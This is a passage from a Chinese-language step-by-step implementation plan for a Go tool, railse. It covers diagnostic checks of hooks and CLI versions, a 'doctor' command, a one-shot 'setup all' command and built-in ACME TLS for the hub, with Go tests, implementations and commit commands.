		out = append(out, Check{ID: "hooks.codex_notify", Name: "Codex notify", Status: Warn, Detail: "~/.codex/config.toml 里没有 notify = [\"…/railse\", \"hook\", \"codex-notify\"]，Codex 的完成与问题事件不会进收件箱", Hint: "按 railse setup hooks 打印的那一行加到 ~/.codex/config.toml"})
	}
	out = append(out, hookFileCheck("hooks.gemini", "Gemini 钩子", "gemini", hooksconf.GeminiPath(o.Project), o))
	return out
}

func hookFileCheck(id, name, cli, path string, o Options) Check {
	hint := "railse setup hooks --project " + o.Project + " --" + cli
	b, err := os.ReadFile(path)
	if err != nil {
		return Check{ID: id, Name: name, Status: Fail, Detail: path + " 不存在", Hint: hint}
	}
	ins, err := hooksconf.Inspect(b, o.Bin)
	if err != nil {
		return Check{ID: id, Name: name, Status: Fail, Detail: path + "：" + err.Error(), Hint: "修好 JSON 后再 " + hint}
	}
	var missing, short []string
	var program string
	for ev, min := range hooksconf.Expected(cli) {
		st := ins.Events[ev]
		switch {
		case !st.Present:
			missing = append(missing, ev)
		case st.Timeout < min:
			short = append(short, fmt.Sprintf("%s(超时 %d，要 ≥ %d)", ev, st.Timeout, min))
		}
		if st.Program != "" {
			program = st.Program
		}
	}
	sort.Strings(missing)
	sort.Strings(short)
	if len(missing) > 0 || len(short) > 0 {
		var parts []string
		if len(missing) > 0 {
			parts = append(parts, "缺 "+strings.Join(missing, "、"))
		}
		if len(short) > 0 {
			parts = append(parts, "超时不够："+strings.Join(short, "、"))
		}
		return Check{ID: id, Name: name, Status: Fail, Detail: path + "：" + strings.Join(parts, "；"), Hint: hint}
	}
	if o.Bin != "" && program != "" && program != o.Bin {
		return Check{ID: id, Name: name, Status: Warn, Detail: fmt.Sprintf("钩子指向 %s，当前程序是 %s", program, o.Bin), Hint: "换过安装路径就重新 " + hint}
	}
	return Check{ID: id, Name: name, Status: OK, Detail: path}
}
```

`internal/doctor/cli.go`:
```go
package doctor

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
)

// 录制钩子样本时的版本（internal/adapter/testdata）与 Gemini 的最低可用版本（实验：0.65.0 之前 BeforeTool 在确认之后才触发）。
const (
	sampleClaude = "2.1.280"
	sampleCodex  = "0.145.0"
	minGemini    = "0.65.0"
)

var versionRe = regexp.MustCompile(`\d+\.\d+\.\d+`)

func parseVersion(s string) ([3]int, bool) {
	m := versionRe.FindString(s)
	if m == "" {
		return [3]int{}, false
	}
	var v [3]int
	for i, p := range strings.SplitN(m, ".", 3) {
		v[i], _ = strconv.Atoi(p)
	}
	return v, true
}

func versionLess(a, b [3]int) bool {
	for i := range a {
		if a[i] != b[i] {
			return a[i] < b[i]
		}
	}
	return false
}

func cliChecks(o Options) []Check {
	var out []Check
	for _, cli := range []struct{ id, name, cmd, sample string }{
		{"cli.claude", "Claude Code 版本", "claude", sampleClaude},
		{"cli.codex", "Codex CLI 版本", "codex", sampleCodex},
		{"cli.gemini", "Gemini CLI 版本", "gemini", ""},
	} {
		path, err := o.LookPath(cli.cmd)
		if err != nil {
			out = append(out, Check{ID: cli.id, Name: cli.name, Status: Skip, Detail: "没有安装 " + cli.cmd})
			continue
		}
		text, err := o.RunCmd(path, "--version")
		v, ok := parseVersion(text)
		if err != nil || !ok {
			out = append(out, Check{ID: cli.id, Name: cli.name, Status: Warn, Detail: cli.cmd + " --version 没有给出版本号", Hint: "手动确认版本"})
			continue
		}
		vs := fmt.Sprintf("%d.%d.%d", v[0], v[1], v[2])
		if cli.cmd == "gemini" {
			minV, _ := parseVersion(minGemini)
			if versionLess(v, minV) {
				out = append(out, Check{ID: cli.id, Name: cli.name, Status: Fail, Detail: fmt.Sprintf("当前 %s，低于 %s：钩子在确认之后才触发，无法在审批前拦截", vs, minGemini), Hint: "升级 Gemini CLI"})
			} else {
				out = append(out, Check{ID: cli.id, Name: cli.name, Status: OK, Detail: vs})
			}
			continue
		}
		if vs != cli.sample {
			out = append(out, Check{ID: cli.id, Name: cli.name, Status: Warn, Detail: fmt.Sprintf("钩子格式按 %s 录制，当前 %s 未验证", cli.sample, vs), Hint: "跑一次 scripts/smoke-claude.sh 或 smoke-claude-hub.sh 确认钩子仍有效"})
		} else {
			out = append(out, Check{ID: cli.id, Name: cli.name, Status: OK, Detail: vs})
		}
	}
	return out
}
```

`internal/doctor/report.go`:
```go
package doctor

import (
	"encoding/json"
	"fmt"
	"io"
)

func errorf(format string, a ...any) error { return fmt.Errorf(format, a...) }

// Write 按行打印结果与汇总。
func (r Report) Write(w io.Writer) {
	counts := map[Status]int{}
	for _, c := range r.Checks {
		counts[c.Status]++
		line := fmt.Sprintf("[%s]", c.Status)
		fmt.Fprintf(w, "%-7s %s", line, c.Name)
		if c.Detail != "" {
			fmt.Fprintf(w, "：%s", c.Detail)
		}
		fmt.Fprintln(w)
		if c.Hint != "" && (c.Status == Fail || c.Status == Warn) {
			fmt.Fprintf(w, "        修复：%s\n", c.Hint)
		}
	}
	fmt.Fprintf(w, "\n%d 项通过，%d 项警告，%d 项失败，%d 项跳过（railse %s）\n", counts[OK], counts[Warn], counts[Fail], counts[Skip], r.Version)
}

// JSON 返回机器可读的结果。
func (r Report) JSON() ([]byte, error) { return json.MarshalIndent(r, "", "  ") }
```

- [ ] **Step 4: 跑测试确认通过**

Run: `gofmt -l . && go vet ./... && go test ./internal/doctor/ ./internal/hub/... -race`
Expected: 全部 PASS。

- [ ] **Step 5: 提交**

```bash
git add internal/doctor internal/hub/store/store.go
git commit -m "feat(doctor): 只读检查守护进程、hub 连接、三个 CLI 的钩子与版本、权限，以及 hub 侧数据库、密码与推送密钥"
```

---

### Task 7: `railse doctor` 命令

**Files:**
- Create: `cmd/railse/doctor.go`
- Create: `cmd/railse/doctor_test.go`
- Modify: `cmd/railse/main.go`（分发与用法）

**Interfaces:**
- `railse doctor [--project 目录] [--dir 目录] [--hub-dir 目录] [--bin 路径] [--json]`
  - `--project` 默认当前目录；`--dir` 默认 `$RAILSE_HOME` 或 `~/.railse`；`--hub-dir` 默认 `$RAILSE_HUB_HOME` 或 `~/.railse-hub`，Linux 上两者都没有时再看 `/var/lib/railse-hub`（`--system` 装的 hub），都不存在时自动跳过 hub 侧并写明看过哪些目录；`--bin` 默认当前程序路径；euid 为 0 或 `$HOME` 属主不是当前用户时不跑 CLI 的 `--version`（`cli.*` 报 skip 并写原因，免得在用户目录留下 root 属主的文件），用法文本写明会跑三个 CLI 的 `--version`（2026-10-25 执行期决定 8、9）
  - 文本输出用 `Report.Write`，`--json` 输出 `Report.JSON`；有 `fail` 退出 1，否则 0
- 包内 `func runDoctor(args []string, stdout, stderr io.Writer) int`

- [ ] **Step 1: 写失败的测试**

`cmd/railse/doctor_test.go`:
```go
package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestDoctorRunsAndExitCodes(t *testing.T) {
	dir, _ := os.MkdirTemp("", "rs")
	defer os.RemoveAll(dir)
	t.Setenv("HOME", dir)
	t.Setenv("RAILSE_HUB_HOME", filepath.Join(dir, "nohub"))
	agentDir := filepath.Join(dir, "h")
	var out, errOut bytes.Buffer
	// 什么都没有：守护进程没在跑 → fail → 退出 1
	code := run([]string{"doctor", "--dir", agentDir, "--project", dir}, &out, &errOut)
	if code != 1 || !strings.Contains(out.String(), "[fail]") || !strings.Contains(out.String(), "项失败") {
		t.Fatalf("doctor: %d %q %q", code, out.String(), errOut.String())
	}
	out.Reset()
	if code := run([]string{"doctor", "--dir", agentDir, "--project", dir, "--json"}, &out, &errOut); code != 1 {
		t.Fatalf("json: %d", code)
	}
	var rep struct {
		Checks []struct {
			ID     string `json:"id"`
			Status string `json:"status"`
		} `json:"checks"`
	}
	if err := json.Unmarshal(out.Bytes(), &rep); err != nil || len(rep.Checks) == 0 {
		t.Fatalf("JSON 输出: %v %s", err, out.String())
	}
	// 起一个守护进程后 agent.running 变 ok
	sock, _, cfg := startTestAgent(t)
	_ = sock
	out.Reset()
	run([]string{"doctor", "--dir", cfg.Dir, "--project", dir, "--json"}, &out, &errOut)
	json.Unmarshal(out.Bytes(), &rep)
	for _, c := range rep.Checks {
		if c.ID == "agent.running" && c.Status != "ok" {
			t.Fatalf("守护进程在跑时 agent.running 应 ok: %+v", rep.Checks)
		}
	}
	if code := run([]string{"doctor", "--bogus"}, &out, &errOut); code != 2 {
		t.Fatalf("坏标志: %d", code)
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./cmd/railse/ -run Doctor`
Expected: FAIL，`doctor` 是未知子命令。

- [ ] **Step 3: 写实现**

`cmd/railse/doctor.go`:
```go
package main

import (
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"

	"github.com/railse/railse-opc/internal/agent"
	"github.com/railse/railse-opc/internal/doctor"
)

const doctorUsage = `用法:
  railse doctor [--project 目录] [--dir 目录] [--hub-dir 目录] [--bin 路径] [--json]
    只读检查：守护进程、hub 连接、三个 CLI 的钩子与版本、文件权限；这台机器有 hub 数据目录时还检查数据库、密码与推送密钥。
    有任一项失败退出码 1。`

func runDoctor(args []string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("doctor", flag.ContinueOnError)
	fs.SetOutput(stderr)
	project := fs.String("project", ".", "项目目录（检查项目级钩子）")
	dir := fs.String("dir", "", "守护进程数据目录，默认 $RAILSE_HOME 或 ~/.railse")
	hubDir := fs.String("hub-dir", "", "hub 数据目录，默认 $RAILSE_HUB_HOME 或 ~/.railse-hub；不存在则跳过")
	bin := fs.String("bin", "", "railse 可执行文件路径，默认当前程序")
	asJSON := fs.Bool("json", false, "输出 JSON")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	if fs.NArg() != 0 {
		fmt.Fprintf(stderr, "多余的参数 %q\n%s\n", fs.Args(), doctorUsage)
		return 2
	}
	cfg, err := agentConfigFor(*dir)
	if err != nil {
		fmt.Fprintln(stderr, err)
		return 1
	}
	hd := *hubDir
	if hd == "" {
		if d, err := defaultHubDir(); err == nil {
			hd = d
		}
	}
	if st, err := os.Stat(hd); err != nil || !st.IsDir() {
		hd = ""
	}
	b := *bin
	if b == "" {
		if exe, err := os.Executable(); err == nil {
			b, _ = filepath.Abs(exe)
		}
	}
	proj, _ := filepath.Abs(*project)
	home, _ := os.UserHomeDir()
	rep := doctor.Run(doctor.Options{AgentDir: cfg.Dir, Project: proj, HubDir: hd, Bin: b, Version: version, Home: home})
	if *asJSON {
		j, err := rep.JSON()
		if err != nil {
			fmt.Fprintln(stderr, err)
			return 1
		}
		fmt.Fprintln(stdout, string(j))
	} else {
		rep.Write(stdout)
	}
	if rep.Failed() {
		return 1
	}
	return 0
}

// agentConfigFor 按 --dir 或默认目录取守护进程配置（与 runAgent 一致）。
func agentConfigFor(dir string) (agent.Config, error) {
	if dir != "" {
		return agent.ConfigIn(dir), nil
	}
	return agent.DefaultConfig()
}
```
`cmd/railse/main.go`：`usage` 加 `  doctor    检查安装与运行状态`，`switch` 加 `case "doctor": return runDoctor(args[1:], stdout, stderr)`。（`runAgent` 里取配置那段若与 `agentConfigFor` 重复，改为调它。）

- [ ] **Step 4: 跑测试确认通过**

Run: `make test && go run ./cmd/railse doctor; echo "exit=$?"`
Expected: 测试全过；本机 doctor 打印各项（没跑守护进程时 `agent.running` fail、退出 1 是正确的）。

- [ ] **Step 5: 提交**

```bash
git add cmd/railse/doctor.go cmd/railse/doctor_test.go cmd/railse/main.go cmd/railse/agent.go
git commit -m "feat(cmd): railse doctor"
```

---

### Task 8: `railse setup all`：一键接入、装钩子、开机自启、体检

**Files:**
- Modify: `cmd/railse/setup.go`
- Modify: `cmd/railse/setup_test.go`

**Interfaces:**
- `railse setup all --hub URL --token 接入码 [--name 名字] [--project 目录] [--dir 目录] [--bin 路径] [--no-autostart] [--no-hooks]`
  - 顺序：1) `agentEnroll`（已有 `machine.json` 且未加 `--force` 时跳过接入并提示，不报错）；2) `setup hooks --project … `（三个 CLI）；3) `setup autostart`（除非 `--no-autostart`；托管后守护进程由 launchd/systemd 启动）；4) `doctor --project … --dir …` 的报告打印；任一步失败立即退出 1 并说明做到了哪一步
  - 结尾打印“下一步”：手机打开 `<hub URL>`、登录、加到主屏幕、开启通知（指向 `docs/web.md`）
- 包内 `func runSetupAll(args []string, stdout, stderr io.Writer) int`

- [ ] **Step 1: 写失败的测试**

`cmd/railse/setup_test.go` 追加：
```go
func TestSetupAllEnrollsHooksAutostartAndDoctor(t *testing.T) {
	h := startTestHub(t)
	tok, _ := h.st.CreateEnrollToken(time.Minute)
	base, _ := os.MkdirTemp("", "rs")
	defer os.RemoveAll(base)
	t.Setenv("HOME", base)
	t.Setenv("RAILSE_HUB_HOME", filepath.Join(base, "nohub"))
	proj := filepath.Join(base, "proj")
	os.MkdirAll(filepath.Join(proj, ".git"), 0o755)
	cfgDir := filepath.Join(base, "h")
	bin := filepath.Join(base, "railse")
	rec := &cmdRec{}
	old := runCommand
	runCommand = rec.run
	defer func() { runCommand = old }()
	var out, errOut bytes.Buffer
	code := run([]string{"setup", "all", "--hub", h.http.URL, "--token", tok, "--name", "mac", "--project", proj, "--dir", cfgDir, "--bin", bin}, &out, &errOut)
	// doctor 会因守护进程没在跑（测试里只托管不真起）而 fail，setup all 把 doctor 结果当信息不当失败
	if code != 0 {
		t.Fatalf("setup all: %d\n%s\n%s", code, out.String(), errOut.String())
	}
	if _, err := os.Stat(filepath.Join(cfgDir, "machine.json")); err != nil {
		t.Fatal("应已接入")
	}
	local, _ := hooksconf.ClaudePaths(proj)
	if _, err := os.Stat(local); err != nil {
		t.Fatal("应已装 Claude 钩子")
	}
	if _, err := os.Stat(hooksconf.CodexPath(base)); err != nil {
		t.Fatal("应已装 Codex 钩子")
	}
	if len(rec.calls) == 0 {
		t.Fatal("应已调用 launchctl/systemctl 托管")
	}
	for _, want := range []string{"已接入", "已写入", "已托管", "[", "下一步"} {
		if !strings.Contains(out.String(), want) {
			t.Fatalf("输出缺 %q:\n%s", want, out.String())
		}
	}
	// 再跑一次：已接入则跳过接入，不报错
	out.Reset()
	if code := run([]string{"setup", "all", "--hub", h.http.URL, "--token", "used", "--project", proj, "--dir", cfgDir, "--bin", bin, "--no-autostart"}, &out, &errOut); code != 0 || !strings.Contains(out.String(), "已接入过") {
		t.Fatalf("第二次: %d %q", code, out.String())
	}
	if code := run([]string{"setup", "all", "--project", proj}, &out, &errOut); code != 2 {
		t.Fatalf("缺 --hub/--token 应退出 2: %d", code)
	}
}
```
（`startTestHub` 在第 3 份的 `hub_test.go`；`cmdRec` 在 Task 5 的 `autostart_test.go`；`time`、`hooksconf` 导入。）

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./cmd/railse/ -run SetupAll`
Expected: FAIL，`setup all` 未知。

- [ ] **Step 3: 写实现**

`cmd/railse/setup.go` 加：
```go
const setupAllUsage = `  railse setup all --hub URL --token 接入码 [--name 名字] [--project 目录] [--dir 目录] [--bin 路径] [--no-autostart] [--no-hooks]
    一键：接入 hub → 装三个 CLI 的钩子 → 开机自启 → 体检（railse doctor）`

func runSetupAll(args []string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("setup all", flag.ContinueOnError)
	fs.SetOutput(stderr)
	hubURL := fs.String("hub", "", "hub 地址，如 https://hub.example.com")
	token := fs.String("token", "", "railse hub token 生成的接入码")
	name := fs.String("name", "", "本机在 hub 里的名字，默认主机名")
	project := fs.String("project", ".", "项目目录")
	dir := fs.String("dir", "", "守护进程数据目录，默认 $RAILSE_HOME 或 ~/.railse")
	bin := fs.String("bin", "", "railse 可执行文件路径，默认当前程序")
	noAutostart := fs.Bool("no-autostart", false, "不托管开机自启")
	noHooks := fs.Bool("no-hooks", false, "不装钩子")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	if fs.NArg() != 0 || *hubURL == "" || *token == "" {
		fmt.Fprintf(stderr, "需要 --hub 与 --token\n%s\n", setupAllUsage)
		return 2
	}
	cfg, err := agentConfigFor(*dir)
	if err != nil {
		fmt.Fprintln(stderr, err)
		return 1
	}
	b := *bin
	if b == "" {
		exe, err := os.Executable()
		if err != nil {
			fmt.Fprintln(stderr, err)
			return 1
		}
		b, _ = filepath.Abs(exe)
	}
	step := func(n int, title string) { fmt.Fprintf(stdout, "\n== %d. %s ==\n", n, title) }
	step(1, "接入 hub")
	if _, err := agent.LoadMachine(cfg.MachinePath); err == nil {
		fmt.Fprintf(stdout, "已接入过（%s），跳过；要换 hub 用 railse agent enroll --force\n", cfg.MachinePath)
	} else if err := agentEnroll(cfg, *hubURL, *token, *name, false, stdout, stderr); err != nil {
		fmt.Fprintf(stderr, "接入失败：%v\n", err)
		return 1
	}
	if !*noHooks {
		step(2, "安装钩子")
		if code := runSetup([]string{"hooks", "--project", *project, "--bin", b}, stdout, stderr); code != 0 {
			fmt.Fprintln(stderr, "装钩子失败，已接入 hub，未托管开机自启")
			return 1
		}
	}
	if !*noAutostart {
		step(3, "开机自启")
		autoArgs := []string{"--bin", b}
		if *dir != "" {
			autoArgs = append(autoArgs, "--dir", cfg.Dir)
		}
		if code := runAutostart(autoArgs, stdout, stderr); code != 0 {
			fmt.Fprintln(stderr, "托管失败，已接入 hub 并装好钩子；可手动 railse agent run")
			return 1
		}
	}
	step(4, "体检")
	doctorArgs := []string{"--project", *project, "--bin", b}
	if *dir != "" {
		doctorArgs = append(doctorArgs, "--dir", cfg.Dir)
	}
	_ = runDoctor(doctorArgs, stdout, stderr) // 体检结果只展示：刚托管的守护进程可能还没起来
	fmt.Fprintf(stdout, "\n下一步：手机上打开 %s 登录，加到主屏幕后在设置里开启通知（见 docs/web.md）。\n", *hubURL)
	return 0
}
```
`runSetup` 分发：`args[0]` 为 `all` 时 `return runSetupAll(args[1:], stdout, stderr)`；`setupUsage` 加 `setupAllUsage`。`agentEnroll` 的签名以 `agent.go` 现状为准（第 3 份是 `agentEnroll(cfg, hubURL, token, name string, force bool, stdout, stderr io.Writer) error`）。

- [ ] **Step 4: 跑测试确认通过**

Run: `make test`
Expected: 全过。

- [ ] **Step 5: 提交**

```bash
git add cmd/railse/setup.go cmd/railse/setup_test.go
git commit -m "feat(setup): railse setup all 一键接入 hub、装钩子、开机自启并体检"
```

---

### Task 9: hub 内置 ACME 直出 TLS

**Files:**
- Create: `internal/hub/acme.go`
- Create: `internal/hub/acme_test.go`
- Modify: `internal/hub/server.go`（`Config` 字段；`validate`；`New` 里的默认值；`Run` 分流）
- Modify: `cmd/railse/hub.go`、`cmd/railse/hub_test.go`
- Modify: `docs/hub.md`

**Interfaces:**
- `Config` 新增 `ACMEDomain string`（空则不启用）、`ACMEEmail string`（可选，给 Let's Encrypt 的联系邮箱）、`ACMECacheDir string`（默认 `Dir/acme`）、`ACMEHTTPListen string`（默认 `:80`，HTTP-01 挑战与 http→https 跳转；`none` 表示不监听 80）
- `validate`：`ACMEDomain` 非空时必须是小写主机名（`^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$`，不带协议、端口、路径）；`New` 里：`ACMEDomain` 非空且 `PublicURL` 为空 → `PublicURL = "https://" + ACMEDomain`；`SecureCookies = true`；`ACMECacheDir` 为空 → `Dir/acme`
- `Run(ctx)`：`ACMEDomain` 非空走 `runTLS`：`autocert.Manager{Prompt: autocert.AcceptTOS, Cache: autocert.DirCache(cacheDir), HostPolicy: autocert.HostWhitelist(domain), Email: email}`；`tls.NewListener(ln, tlsConfig)` 其中 `tlsConfig = m.TLSConfig()` 加 `MinVersion: tls.VersionTLS12`；`ACMEHTTPListen != "none"` 时另起 `http.Server{Addr: ACMEHTTPListen, Handler: m.HTTPHandler(nil), ReadHeaderTimeout: 10s, ReadTimeout: 30s}`（`nil` 回退 = 302 跳到 https），随 ctx 关停；主服务仍走既有 `serve(ctx, tlsLn)`（同一套关停逻辑）
- 包内可测：`func (s *Server) acmeManager() *autocert.Manager`；`func (s *Server) tlsConfig() *tls.Config`（字段 `tlsConfigFn func() *tls.Config`，测试可换成自签证书）；`func (s *Server) serveTLS(ctx context.Context, ln net.Listener) error`
- CLI：`railse hub run` 加 `--acme-domain`、`--acme-email`、`--acme-http`（默认 `:80`）；`--acme-domain` 给了而 `--listen` 没给时监听 `:443`；用法文本说明 443/80 需要 root 或 `CAP_NET_BIND_SERVICE`（`railse setup autostart --hub --system` 会加）

- [ ] **Step 1: 写失败的测试**

`internal/hub/acme_test.go`:
```go
package hub

import (
	"context"
	"crypto/tls"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestACMEConfigDefaultsAndValidation(t *testing.T) {
	h := newTestHubWith(t, func(c *Config) { c.ACMEDomain = "hub.example.com" }, nil)
	if h.srv.cfg.PublicURL != "https://hub.example.com" || !h.srv.cfg.SecureCookies || h.srv.cfg.ACMECacheDir != filepath.Join(h.dir, "acme") || h.srv.cfg.ACMEHTTPListen != ":80" {
		t.Fatalf("默认值: %+v", h.srv.cfg)
	}
	m := h.srv.acmeManager()
	if m == nil || m.Email != "" || m.HostPolicy == nil {
		t.Fatal("acmeManager")
	}
	if err := m.HostPolicy(context.Background(), "hub.example.com"); err != nil {
		t.Fatal(err)
	}
	if err := m.HostPolicy(context.Background(), "evil.example.com"); err == nil {
		t.Fatal("别的域名应被拒")
	}
	tc := h.srv.tlsConfig()
	if tc.MinVersion != tls.VersionTLS12 || tc.GetCertificate == nil || !containsStr(tc.NextProtos, "acme-tls/1") {
		t.Fatalf("tlsConfig: %+v", tc)
	}
	for _, bad := range []string{"https://hub.example.com", "hub.example.com:443", "Hub.Example.com", "localhost", "hub.example.com/x", "-bad.example.com"} {
		st, _ := newStoreForTest(t)
		cfg := DefaultConfig(t.TempDir())
		cfg.ACMEDomain = bad
		if _, err := New(cfg, st, discardLogger()); err == nil {
			t.Errorf("%q 应被拒", bad)
		}
	}
}

func TestACMERedirectHandler(t *testing.T) {
	h := newTestHubWith(t, func(c *Config) { c.ACMEDomain = "hub.example.com" }, nil)
	srv := httptest.NewServer(h.srv.acmeManager().HTTPHandler(nil))
	defer srv.Close()
	client := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	req, _ := http.NewRequest("GET", srv.URL+"/r/abc?x=1", nil)
	req.Host = "hub.example.com"
	resp, err := client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode != http.StatusFound || resp.Header.Get("Location") != "https://hub.example.com/r/abc?x=1" {
		t.Fatalf("跳转: %d %s", resp.StatusCode, resp.Header.Get("Location"))
	}
}

func TestServeTLSWithInjectedCert(t *testing.T) {
	h := newTestHubWith(t, func(c *Config) { c.ACMEDomain = "hub.example.com"; c.ACMEHTTPListen = "none" }, func(s *Server) {
		cert, err := tls.X509KeyPair(localhostCertPEM, localhostKeyPEM) // 用 net/http/internal 风格的自签测试证书，放在 acme_test.go 末尾
		if err != nil {
			t.Fatal(err)
		}
		s.tlsConfigFn = func() *tls.Config { return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12} }
	})
	h.srv.SetPassword("hunter22")
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() { done <- h.srv.serveTLS(ctx, ln) }()
	client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}, Timeout: 5 * time.Second}
	base := "https://" + ln.Addr().String()
	waitFor(t, "TLS 服务起来", func() bool {
		resp, err := client.Get(base + "/api/version")
		if err != nil {
			return false
		}
		resp.Body.Close()
		return resp.StatusCode == 200
	})
	resp, err := client.Post(base+"/api/login", "application/json", strings.NewReader(`{"password":"hunter22"}`))
	if err != nil || resp.StatusCode != http.StatusNoContent {
		t.Fatalf("login over TLS: %v %v", err, resp)
	}
	var secure bool
	for _, c := range resp.Cookies() {
		if c.Name == "railse_session" {
			secure = c.Secure
		}
	}
	if !secure {
		t.Fatal("经 TLS 的 cookie 应带 Secure")
	}
	cancel()
	select {
	case err := <-done:
		if err != nil {
			t.Fatal(err)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("没有停下")
	}
	if st, err := os.Stat(h.srv.cfg.ACMECacheDir); err != nil || st.Mode().Perm() != 0o700 {
		t.Fatalf("证书目录应 0700: %v", err)
	}
}

func containsStr(list []string, s string) bool {
	for _, x := range list {
		if x == s {
			return true
		}
	}
	return false
}
```
（`newStoreForTest`、`discardLogger` 若第 3 份的测试辅助里没有同名函数，就用 `store.Open` 到临时目录与 `log.New(io.Discard, "", 0)` 代替。`localhostCertPEM`、`localhostKeyPEM` 用 `go run $(go env GOROOT)/src/crypto/tls/generate_cert.go --host 127.0.0.1 --ecdsa-curve P256 --duration 87600h` 生成一次，内容作为 `[]byte` 常量放进测试文件（只是测试用自签证书，不是秘密）。）

`cmd/railse/hub_test.go` 追加：
```go
func TestHubRunACMEFlags(t *testing.T) {
	dir := filepath.Join(mkTemp(t), "hub")
	var out, errOut bytes.Buffer
	if code := runHub([]string{"run", "--dir", dir, "--acme-domain", "https://x.example.com"}, nil, &out, &errOut); code != 2 || !strings.Contains(errOut.String(), "acme-domain") {
		t.Fatalf("坏域名应退出 2: %d %q", code, errOut.String())
	}
	cfg, code := hubConfigFromArgs([]string{"run", "--dir", dir, "--acme-domain", "hub.example.com", "--acme-email", "me@example.com"}, &errOut)
	if code != 0 || cfg.Listen != ":443" || cfg.ACMEDomain != "hub.example.com" || cfg.ACMEEmail != "me@example.com" || cfg.ACMEHTTPListen != ":80" {
		t.Fatalf("ACME 默认监听: %d %+v", code, cfg)
	}
	cfg, _ = hubConfigFromArgs([]string{"run", "--dir", dir, "--acme-domain", "hub.example.com", "--listen", ":8443", "--acme-http", "none"}, &errOut)
	if cfg.Listen != ":8443" || cfg.ACMEHTTPListen != "none" {
		t.Fatalf("显式监听: %+v", cfg)
	}
}
```
（`hubConfigFromArgs` 是把 `runHub` 里“解析标志 → 组 `hub.Config`”那段抽出来的函数，返回 `(hub.Config, int)`，退出码非 0 表示用法错；本 Task 顺手抽出，`runHub` 调它。）

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/hub/ -run ACME; go test ./cmd/railse/ -run HubRunACME`
Expected: FAIL，`ACMEDomain` 等未定义。

- [ ] **Step 3: 写实现**

`internal/hub/server.go`：
- `Config` 加：
```go
	// ACMEDomain 非空时 hub 自己向 Let's Encrypt 申请证书并直出 TLS；PublicURL 默认 https://<域名>，cookie 一律 Secure。
	ACMEDomain string
	ACMEEmail  string
	// ACMECacheDir 存账户与证书私钥（明文，设计 5.3 的例外），默认 Dir/acme，0700。
	ACMECacheDir string
	// ACMEHTTPListen 是 HTTP-01 挑战与 http→https 跳转的监听地址，默认 :80；"none" 不监听。
	ACMEHTTPListen string
```
- `validate` 加：
```go
	if c.ACMEDomain != "" {
		if !acmeDomainRe.MatchString(c.ACMEDomain) {
			return fmt.Errorf("acme-domain 必须是小写主机名（不带协议、端口、路径），得到 %q", c.ACMEDomain)
		}
		if c.ACMEHTTPListen != "none" {
			if _, _, err := net.SplitHostPort(c.ACMEHTTPListen); err != nil {
				return fmt.Errorf("acme-http 应是 host:port 或 none，得到 %q", c.ACMEHTTPListen)
			}
		}
	}
```
`var acmeDomainRe = regexp.MustCompile(`^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$`)`。
- `New` 在 `validate` 之前填默认：`if cfg.ACMEDomain != "" { if cfg.PublicURL == "" { cfg.PublicURL = "https://" + cfg.ACMEDomain }; cfg.SecureCookies = true; if cfg.ACMECacheDir == "" { cfg.ACMECacheDir = filepath.Join(cfg.Dir, "acme") }; if cfg.ACMEHTTPListen == "" { cfg.ACMEHTTPListen = ":80" } }`；`Server` 加字段 `tlsConfigFn func() *tls.Config`，`New` 里 `s.tlsConfigFn = s.defaultTLSConfig`。
- `Run`：`if s.cfg.ACMEDomain != "" { return s.runTLS(ctx) }` 放在现有 `net.Listen` 之前。

`internal/hub/acme.go`:
```go
package hub

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"net"
	"net/http"
	"os"
	"time"

	"golang.org/x/crypto/acme/autocert"
)

// acmeManager 组 autocert：只给配置的域名签、证书与账户私钥存数据目录的 acme/（0700）。
func (s *Server) acmeManager() *autocert.Manager {
	return &autocert.Manager{
		Prompt:     autocert.AcceptTOS,
		Cache:      autocert.DirCache(s.cfg.ACMECacheDir),
		HostPolicy: autocert.HostWhitelist(s.cfg.ACMEDomain),
		Email:      s.cfg.ACMEEmail,
	}
}

// defaultTLSConfig 是 autocert 的 TLS 配置（含 TLS-ALPN-01 挑战）加最低 TLS 1.2。
func (s *Server) defaultTLSConfig() *tls.Config {
	tc := s.acmeManager().TLSConfig()
	tc.MinVersion = tls.VersionTLS12
	return tc
}

func (s *Server) tlsConfig() *tls.Config { return s.tlsConfigFn() }

// runTLS 监听 cfg.Listen 直出 TLS，另在 ACMEHTTPListen 起 HTTP-01 挑战与跳转。
func (s *Server) runTLS(ctx context.Context) error {
	if err := os.MkdirAll(s.cfg.ACMECacheDir, 0o700); err != nil {
		return fmt.Errorf("建证书目录: %w", err)
	}
	if err := os.Chmod(s.cfg.ACMECacheDir, 0o700); err != nil {
		return fmt.Errorf("收紧证书目录权限: %w", err)
	}
	ln, err := net.Listen("tcp", s.cfg.Listen)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrListen, err)
	}
	return s.serveTLS(ctx, ln)
}

// serveTLS 用 ln 直出 TLS（测试传入自己的监听器与证书）。
func (s *Server) serveTLS(parent context.Context, ln net.Listener) error {
	ctx, cancel := context.WithCancel(parent)
	defer cancel()
